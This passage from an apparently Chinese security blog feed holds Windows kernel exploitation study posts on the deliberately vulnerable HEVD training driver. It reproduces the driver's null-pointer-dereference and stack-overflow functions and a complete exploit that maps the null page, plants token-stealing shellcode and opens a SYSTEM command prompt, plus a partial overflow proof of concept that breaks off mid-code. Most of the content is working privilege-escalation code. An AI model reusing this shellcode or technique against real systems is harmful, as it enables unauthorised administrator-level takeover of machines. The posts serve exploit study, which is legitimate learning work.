printf(&quot;IOCTL request completed,cleaning up da heap.\r\n&quot;);</div><div class="line">    CloseHandle(hDriver);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当运行exp之后便提权成功。<br><img src="/img/5.png" alt="image"></p>
<p>参考资料</p>
<p><a href="http://www.hacking-training.com/download/WKE.pdf" target="_blank" rel="external">http://www.hacking-training.com/download/WKE.pdf</a></p>
<p><a href="https://osandamalith.com/2017/06/14/windows-kernel-exploitation-arbitrary-overwrite/?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">https://osandamalith.com/2017/06/14/windows-kernel-exploitation-arbitrary-overwrite/?utm_source=tuicool&amp;utm_medium=referral</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[windows内核漏洞学习篇-空指针引用]]></title>
      <url>http://yoursite.com/2017/06/26/windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AF%87-%E7%A9%BA%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>漏洞代码如下，挺简单的基本上都有注释了。这个漏洞感觉非常简单，我也只是复现了一下，具体原理看参考部分。\</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">NTSTATUS TriggerNullPointerDereference(IN PVOID UserBuffer) &#123;</div><div class="line">    ULONG UserValue = 0;</div><div class="line">    ULONG MagicValue = 0xBAD0B0B0;</div><div class="line">    NTSTATUS Status = STATUS_SUCCESS;</div><div class="line">    PNULL_POINTER_DEREFERENCE NullPointerDereference = NULL;</div><div class="line"> </div><div class="line">    PAGED_CODE();</div><div class="line"> </div><div class="line">    __try &#123;</div><div class="line">        // Verify if the buffer resides in user mode</div><div class="line">        ProbeForRead(UserBuffer,</div><div class="line">                     sizeof(NULL_POINTER_DEREFERENCE),</div><div class="line">                     (ULONG)__alignof(NULL_POINTER_DEREFERENCE));</div><div class="line"> </div><div class="line">        // Allocate Pool chunk</div><div class="line">        NullPointerDereference = (PNULL_POINTER_DEREFERENCE)</div><div class="line">                                  ExAllocatePoolWithTag(NonPagedPool,</div><div class="line">                                                        sizeof(NULL_POINTER_DEREFERENCE),</div><div class="line">                                                        (ULONG)POOL_TAG);</div><div class="line"> </div><div class="line">        if (!NullPointerDereference) &#123;</div><div class="line">            // Unable to allocate Pool chunk</div><div class="line">            DbgPrint(&quot;[-] Unable to allocate Pool chunk\n&quot;);</div><div class="line"> </div><div class="line">            Status = STATUS_NO_MEMORY;</div><div class="line">            return Status;</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG));</div><div class="line">            DbgPrint(&quot;[+] Pool Type: %s\n&quot;, STRINGIFY(NonPagedPool));</div><div class="line">            DbgPrint(&quot;[+] Pool Size: 0x%X\n&quot;, sizeof(NULL_POINTER_DEREFERENCE));</div><div class="line">            DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, NullPointerDereference);</div><div class="line">        &#125;</div><div class="line"> </div><div class="line">        // Get the value from user mode</div><div class="line">        UserValue = *(PULONG)UserBuffer;</div><div class="line"> </div><div class="line">        DbgPrint(&quot;[+] UserValue: 0x%p\n&quot;, UserValue);</div><div class="line">        DbgPrint(&quot;[+] NullPointerDereference: 0x%p\n&quot;, NullPointerDereference);</div><div class="line"> </div><div class="line">        // Validate the magic value</div><div class="line">        if (UserValue == MagicValue) &#123;</div><div class="line">            NullPointerDereference-&gt;Value = UserValue;</div><div class="line">            NullPointerDereference-&gt;Callback = &amp;NullPointerDereferenceObjectCallback;</div><div class="line"> </div><div class="line">            DbgPrint(&quot;[+] NullPointerDereference-&gt;Value: 0x%p\n&quot;, NullPointerDereference-&gt;Value);</div><div class="line">            DbgPrint(&quot;[+] NullPointerDereference-&gt;Callback: 0x%p\n&quot;, NullPointerDereference-&gt;Callback);</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            DbgPrint(&quot;[+] Freeing NullPointerDereference Object\n&quot;);</div><div class="line">            DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG));</div><div class="line">            DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, NullPointerDereference);</div><div class="line"> </div><div class="line">            // Free the allocated Pool chunk</div><div class="line">            ExFreePoolWithTag((PVOID)NullPointerDereference, (ULONG)POOL_TAG);</div><div class="line"> </div><div class="line">            // Set to NULL to avoid dangling pointer</div><div class="line">            NullPointerDereference = NULL;</div><div class="line">        &#125;</div><div class="line"> </div><div class="line">#ifdef SECURE</div><div class="line">        // Secure Note: This is secure because the developer is checking if</div><div class="line">        // &apos;NullPointerDereference&apos; is not NULL before calling the callback function</div><div class="line">        if (NullPointerDereference) &#123;</div><div class="line">            NullPointerDereference-&gt;Callback();</div><div class="line">        &#125;</div><div class="line">#else</div><div class="line">        DbgPrint(&quot;[+] Triggering Null Pointer Dereference\n&quot;);</div><div class="line"> </div><div class="line">        // Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability</div><div class="line">        // because the developer is not validating if &apos;NullPointerDereference&apos; is NULL</div><div class="line">        // before calling the callback function</div><div class="line">        NullPointerDereference-&gt;Callback();</div><div class="line">#endif</div><div class="line">    &#125;</div><div class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</div><div class="line">        Status = GetExceptionCode();</div><div class="line">        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    return Status;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>exp部分如下所示，不过在参考中的exp需要更爱一下，改成xp下的shellcode偏移。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div></pre></td><td class="code"><pre><div class="line">include &quot;stdafx.h&quot;</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">#include &lt;Windows.h&gt;</div><div class="line"></div><div class="line">#include &lt;shlobj.h&gt;</div><div class="line"></div><div class="line">#include &lt;winioctl.h&gt;</div><div class="line">#include &lt;TlHelp32.h&gt;</div><div class="line"></div><div class="line">#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread</div><div class="line"></div><div class="line">#define EPROCESS_OFFSET   0x044    // nt!_KTHREAD.ApcState.Process</div><div class="line"></div><div class="line">#define PID_OFFSET        0x084    // nt!_EPROCESS.UniqueProcessId</div><div class="line"></div><div class="line">#define FLINK_OFFSET      0x088    // nt!_EPROCESS.ActiveProcessLinks.Flink</div><div class="line"></div><div class="line">#define TOKEN_OFFSET      0xC8    // nt!_EPROCESS.Tokenc</div><div class="line">#define SYSTEM_PID        0x004    // SYSTEM Process PID</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(</div><div class="line"></div><div class="line">	HANDLE ProcessHandle,</div><div class="line"></div><div class="line">	PVOID *BaseAddress,</div><div class="line"></div><div class="line">	ULONG ZeroBits,</div><div class="line"></div><div class="line">	PULONG AllocationSize,</div><div class="line"></div><div class="line">	ULONG AllocationType,</div><div class="line"></div><div class="line">	ULONG Protect</div><div class="line"></div><div class="line">	);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">VOID TokenStealingShellcodeWin7() &#123;</div><div class="line"></div><div class="line">	__asm &#123;</div><div class="line"></div><div class="line">		; initialize</div><div class="line"></div><div class="line">			pushad; save registers state</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">			xor eax, eax; Set zero</div><div class="line"></div><div class="line">			mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread</div><div class="line"></div><div class="line">			mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">			mov ecx, eax; Copy current _EPROCESS structure</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">			mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token</div><div class="line"></div><div class="line">			mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">		SearchSystemPID:</div><div class="line"></div><div class="line">		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink</div><div class="line"></div><div class="line">			sub eax, FLINK_OFFSET</div><div class="line"></div><div class="line">			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId</div><div class="line"></div><div class="line">			jne SearchSystemPID</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token</div><div class="line"></div><div class="line">			mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM</div><div class="line"></div><div class="line">			; to current process</div><div class="line"></div><div class="line">			popad; restore registers state</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int _tmain(void)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">	HANDLE hDevice;</div><div class="line"></div><div class="line">	DWORD lpBytesReturned;</div><div class="line"></div><div class="line">	PVOID pMemoryAddress = NULL;</div><div class="line"></div><div class="line">	LPCWSTR lpDeviceName = L&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;;</div><div class="line"></div><div class="line">	STARTUPINFO si = &#123; sizeof(STARTUPINFO) &#125;;</div><div class="line"></div><div class="line">	PROCESS_INFORMATION pi;</div><div class="line"></div><div class="line">	ULONG MagicValue = 0xBaadBabe;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	hDevice = CreateFile(</div><div class="line"></div><div class="line">		lpDeviceName,</div><div class="line"></div><div class="line">		GENERIC_READ | GENERIC_WRITE,</div><div class="line"></div><div class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE,</div><div class="line"></div><div class="line">		NULL,</div><div class="line"></div><div class="line">		OPEN_EXISTING,</div><div class="line"></div><div class="line">		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</div><div class="line"></div><div class="line">		NULL);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	wprintf(L&quot;[*] Author: @OsandaMalith\n[*] Website: https://osandamalith.com\n\n&quot;);</div><div class="line"></div><div class="line">	wprintf(L&quot;[+] lpDeviceName: %ls\n&quot;, lpDeviceName);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	if (hDevice == INVALID_HANDLE_VALUE) &#123;</div><div class="line"></div><div class="line">		wprintf(L&quot;[!] Failed to get a handle to the driver. 0x%x\n&quot;, GetLastError());</div><div class="line"></div><div class="line">		return -1;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	if (!NtAllocateVirtualMemory) &#123;</div><div class="line"></div><div class="line">		wprintf(L&quot;[!] Failed to Resolve NtAllocateVirtualMemory: 0x%X\n&quot;, GetLastError());</div><div class="line"></div><div class="line">		return -1;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	PVOID BaseAddress = (PVOID)0x1;</div><div class="line"></div><div class="line">	SIZE_T RegionSize = 1024;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	NTSTATUS ntStatus = NtAllocateVirtualMemory(</div><div class="line"></div><div class="line">		GetCurrentProcess(),</div><div class="line"></div><div class="line">		&amp;BaseAddress,</div><div class="line"></div><div class="line">		0,</div><div class="line"></div><div class="line">		&amp;RegionSize,</div><div class="line"></div><div class="line">		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,</div><div class="line"></div><div class="line">		PAGE_EXECUTE_READWRITE</div><div class="line"></div><div class="line">		);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	PVOID ShellcodePtr = (PVOID)((ULONG)0x4);</div><div class="line"></div><div class="line">	*(PULONG)ShellcodePtr = (ULONG)&amp;TokenStealingShellcodeWin7;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	wprintf(L&quot;[+] Sending IOCTL request\n&quot;);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	DeviceIoControl(</div><div class="line"></div><div class="line">		hDevice,</div><div class="line"></div><div class="line">		HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,</div><div class="line"></div><div class="line">		(LPVOID)&amp;MagicValue,</div><div class="line"></div><div class="line">		NULL,</div><div class="line"></div><div class="line">		NULL,</div><div class="line"></div><div class="line">		0,</div><div class="line"></div><div class="line">		&amp;lpBytesReturned,</div><div class="line"></div><div class="line">		NULL);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	ZeroMemory(&amp;si, sizeof si);</div><div class="line"></div><div class="line">	si.cb = sizeof si;</div><div class="line"></div><div class="line">	ZeroMemory(&amp;pi, sizeof pi);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	IsUserAnAdmin() ?</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	CreateProcess(</div><div class="line"></div><div class="line">		L&quot;C:\\Windows\\System32\\cmd.exe&quot;,</div><div class="line"></div><div class="line">		L&quot;/T:17&quot;,</div><div class="line"></div><div class="line">		NULL,</div><div class="line"></div><div class="line">		NULL,</div><div class="line"></div><div class="line">		0,</div><div class="line"></div><div class="line">		CREATE_NEW_CONSOLE,</div><div class="line"></div><div class="line">		NULL,</div><div class="line"></div><div class="line">		NULL,</div><div class="line"></div><div class="line">		(STARTUPINFO *)&amp;si,</div><div class="line"></div><div class="line">		(PROCESS_INFORMATION *)&amp;pi) :</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	wprintf(L&quot;[!] Exploit Failed!&quot;);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	CloseHandle(hDevice);</div><div class="line"></div><div class="line">	return 0;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后编译运行成功后的截图<br><img src="/img/4.png" alt="image"></p>
<p>参考链接 \</p>
<p><a href="https://osandamalith.com/2017/06/22/windows-kernel-exploitation-null-pointer-dereference/#more-2548" target="_blank" rel="external">https://osandamalith.com/2017/06/22/windows-kernel-exploitation-null-pointer-dereference/#more-2548</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[windows内核漏洞学习篇-栈溢出]]></title>
      <url>http://yoursite.com/2017/06/22/windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AF%87-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      <content type="html"><![CDATA[<h2 id="一、感慨"><a href="#一、感慨" class="headerlink" title="一、感慨"></a><strong>一、感慨</strong></h2><p>看到大神都在用hevd来学习，我也打算用这个东西来踏入我的学习之旅，不过由于没学过windows编程和驱动开发，一开始有点看不懂poc之类的东西，只能一边学习编程，一边学习漏洞原理。网上有很多搭建调试环境的方法，我就不写了，说说我碰到的问题吧，一开始用自己编译的hevd.sys文件，经过利用后发现有点问题，然后又用别人编译好的，我又发现exp不能执行成功，后来把vc6换了2008编译器，总算成功了，就这个耗费了我很长时间。</p>
<h2 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a><strong>二、分析</strong></h2><p>环境:xp sp3\<br>调试工具:windbg</p>
<p>废话不多说直接分析代码，见注释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) &#123;</div><div class="line">    NTSTATUS Status = STATUS_SUCCESS;</div><div class="line">    ULONG KernelBuffer[BUFFER_SIZE] = &#123;0&#125;;</div><div class="line"></div><div class="line">    PAGED_CODE();</div><div class="line"></div><div class="line">    __try &#123;</div><div class="line">        // Verify if the buffer resides in user mode</div><div class="line">        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));</div><div class="line"></div><div class="line">        DbgPrint(&quot;[+] UserBuffer: 0x%p\n&quot;, UserBuffer);</div><div class="line">        DbgPrint(&quot;[+] UserBuffer Size: 0x%X\n&quot;, Size);</div><div class="line">        DbgPrint(&quot;[+] KernelBuffer: 0x%p\n&quot;, &amp;KernelBuffer);</div><div class="line">        DbgPrint(&quot;[+] KernelBuffer Size: 0x%X\n&quot;, sizeof(KernelBuffer));</div><div class="line"></div><div class="line">#ifdef SECURE</div><div class="line">        // Secure Note: This is secure because the developer is passing a size</div><div class="line">        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</div><div class="line">        // there will be no overflow</div><div class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));</div><div class="line">#else</div><div class="line">        DbgPrint(&quot;[+] Triggering Stack Overflow\n&quot;);</div><div class="line"></div><div class="line">       </div><div class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);//这里在拷贝内存的时候没有限制size的大小，超出了kernelBuffer的大小，造成了缓冲区溢出。</div><div class="line">#endif</div><div class="line">    &#125;</div><div class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</div><div class="line">        Status = GetExceptionCode();</div><div class="line">        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return Status;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>漏洞原因很简单，接着我们利用poc来覆盖ebp和返回地址，利用大量字符串来确定具体位置，详见poc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">#include &quot;stdafx.h&quot;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;Windows.h&gt;</div><div class="line">#include &lt;winioctl.h&gt;</div><div class="line">#include &lt;TlHelp32.h&gt;</div><div class="line"></div><div class="line">#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)</div><div class="line"></div><div class="line">int _tmain(int argc,_TCHAR* argv[])&#123;</div><div class="line"></div><div class="line">    DWORD lpBytesReturned;</div><div class="line">    PVOID pMemoryAddress = NULL;</div><div class="line">    PULONG lpInBuffer = NULL;</div><div class="line">    LPCSTR lpDeviceName = (LPCSTR) &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;;</div><div class="line">    SIZE_T nInBufferSize = 768 * sizeof(ULONG);</div><div class="line">    //SIZE_T nInBufferSize = 1024 * sizeof(ULONG);</div><div class="line"></div><div class="line">    printf(&quot;[*]Getting the device handle\r\n&quot;);</div><div class="line">    HANDLE hDriver = CreateFileA(lpDeviceName,</div><div class="line">        GENERIC_READ | GENERIC_WRITE,</div><div class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</div><div class="line">        NULL,</div><div class="line">        OPEN_EXISTING,</div><div class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</div><div class="line">        NULL);</div><div class="line">    if (hDriver == INVALID_HANDLE_VALUE) &#123;</div><div class="line">        printf(&quot;[*]Failed to get device handle : (0x%X\r\n)&quot;,GetLastError());</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    printf(&quot;[*]Got the device Handle : 0x%X\r\n&quot;, hDriver);</div><div class="line">    printf(&quot;[*]Allocating Memory For Input Buffer\r\n&quot;);</div><div class="line">    lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);</div><div class="line"></div><div class="line">    if (!lpInBuffer) &#123;</div><div class="line">        printf(&quot;[*]HeapAlloc failed :(0x%X\r\n)&quot;,GetLastError());</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    printf(&quot;[*]Input buffer allocated as 0x%X bytes.\r\n&quot;,nInBufferSize);</div><div class="line">    printf(&quot;[*]Input buffer address : 0x%p\r\n&quot;,lpInBuffer);</div><div class="line">    printf(&quot;[*]Filling buffer with A&apos;s\r\n&quot;);</div><div class="line"></div><div class="line"></div><div class="line">    char *data = &quot;&quot;;   //这里填生成的字符串</div><div class="line"></div><div class="line">    memcpy(lpInBuffer,data,nInBufferSize);</div><div class="line"></div><div class="line"> </div><div class="line">    printf(&quot;[*]Send IOCTL request\r\n&quot;);</div><div class="line"></div><div class="line">    DeviceIoControl(hDriver,</div><div class="line">        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</div><div class="line">        (LPVOID)lpInBuffer,</div><div class="line">        (DWORD)nInBufferSize,</div><div class="line">        NULL,</div><div class="line">        0,</div><div class="line">        &amp;lpBytesReturned,</div><div class="line">        NULL);</div><div class="line"></div><div class="line">    printf(&quot;[*]IOCTL request completed,cleaning up da heap.\r\n&quot;);</div><div class="line">    